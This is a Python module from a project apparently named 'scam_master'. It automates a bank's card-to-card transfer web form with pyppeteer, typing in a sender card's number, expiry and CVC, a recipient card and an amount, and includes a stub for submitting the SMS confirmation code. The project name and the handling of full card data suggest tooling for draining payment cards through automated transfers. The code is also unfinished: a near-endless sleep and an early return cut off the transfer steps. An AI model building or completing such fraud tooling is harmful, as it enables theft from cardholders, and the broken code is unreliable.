import asyncio
from pyppeteer.page import Page as PyppPage
from loguru import logger

from scam_master.infrastructure.banks.interface import IBankTransfer
from scam_master.services.models.transactions import Card
from scam_master.services.models.errors import UNKNOWN_TRANSFER_STATUS, BankError


class PochtabankTransfer(IBankTransfer):
    @staticmethod
    async def fill_out_transfer_form(page: PyppPage, url: str, sender_card: Card, recipient_card_number: str, amount: int) -> None:
        try:            
            await page.goto(url)
            
            # await page.waitForXPath('//input[@name="pan1"]')
            # await page.type('//input[@name="pan1"]', sender_card.card_number)

            # await page.waitFor('input[id="cardFrom"]')
            await asyncio.sleep(1000000)

            t = await page.evaluate('''
                          () => {
                            let iframe = document.querySelector(".iframe.p2p")
                            return iframe
                          }
                          ''')
            logger.info(t)
            logger.info(t.contentFrame())


            await page.waitForSelector('iframe[class="iframe p2p"]')
            ifarme = await page.querySelector('iframe[class="iframe p2p"]')
            frame = await ifarme.contentFrame()

            logger.info(frame)

            # frames = page.frames

            # for i in frames:
            #     logger.info(i.url, i.childFrames)

            # iframe = next(frame for frame in frames if "P2PTransfer.html" in frame.url)

            # ifarme = await page.querySelector('iframe[class="iframe p2p"]')
            # frame = await ifarme.contentFrame()

            return

            await frame.waitFor('input[id="cardFrom"]')

            await frame.type('input[id="cardFrom"]', sender_card.card_number)

            await asyncio.sleep(2)

            await page.type('//*[@id="cardDate"]', sender_card.expiration_date)
            
            await asyncio.sleep(2)

            await page.type('//*[@id="cvc"]', sender_card.cvc)

            await asyncio.sleep(2)

            await page.type('//*[@id="cardFrom"]', recipient_card_number)

            await asyncio.sleep(2)
            
            transfer_amount = f"{(amount / 100):.2f}"
            await page.type('//*[@id="amountControl"]', transfer_amount)
            
            await asyncio.sleep(2)

            await page.click('//*[@id="agree"]')

            await asyncio.sleep(2)

            await page.click('//*[@id="submitButton"]')
            
            # TODO ждать появления формы подтверждения
        
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    async def confirm_transfer(page: PyppPage, sms_code: str) -> None:
        try:
            ...
        
        except BankError:
            raise

        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS
    
    @staticmethod
    async def _check_transfer_status(page: PyppPage) -> str:
        try:
            ...
        
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS
